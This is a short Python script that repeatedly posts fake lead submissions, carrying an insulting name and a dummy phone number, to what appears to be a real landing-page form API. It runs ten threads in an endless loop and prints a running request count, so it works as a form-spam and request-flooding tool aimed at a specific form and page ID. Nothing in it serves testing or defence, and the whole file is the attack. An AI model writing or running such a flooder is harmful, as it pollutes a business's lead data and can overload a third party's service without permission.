import threading
from time import sleep
import requests

from utils import startThread
url = "https://api2.ldpform.net/sendform"

json = {
"data_key":  "null",
"form_config_id" :  "65716d0aeb337d0012f38173",
"form_data" : [{"name": "name", "value": "yourmama"}, {"name": "phone", "value": "09123912912"}],
"ladi_form_id" : "FORM11",
"ladipage_id" : "65716caa0d71360011dbd41c",
"status_send" : 2,
"time_zone" : 7,
"total_revenue" : 0,
}

total_request = 0
def post():
    global total_request 
    while True:
        res =  requests.post(url, json=json)
        total_request += 1
        if res.status_code != 200:
            print("ERROR HAPPENED")
            break

def printRequest():
    print("STARTING")
    global total_request
    while True:
        print(total_request)
        sleep(1)

t = threading.Thread(target=printRequest)
t.daemon = True
startThread(10, post,threads=[t])